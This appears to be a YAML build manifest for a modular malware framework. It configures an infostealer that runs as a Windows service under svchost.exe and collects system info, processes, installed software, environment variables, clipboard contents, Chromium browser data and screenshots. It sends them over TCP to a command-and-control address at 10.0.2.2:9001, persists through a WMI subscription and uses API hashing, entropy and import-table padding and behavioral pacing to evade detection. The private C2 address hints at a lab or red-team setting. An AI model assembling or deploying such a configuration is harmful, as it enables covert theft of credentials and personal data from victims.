name: infostealer_service
description: Infostealer as Windows service — runs under svchost.exe, survives logoff

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/system_info
  - collectors/processes
  - collectors/installed_software
  - collectors/env_vars
  - collectors/clipboard
  - collectors/browser_chromium
  - collectors/screenshot

exfil: exfil/tcp_direct
arch: arch/service

api_resolve: api_resolve/api_hash_djb2

persist: persist/wmi_subscription

resources: true

evasion:
  - evasion/entropy_pad
  - evasion/iat_pad
  - evasion/behavioral_pacing

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
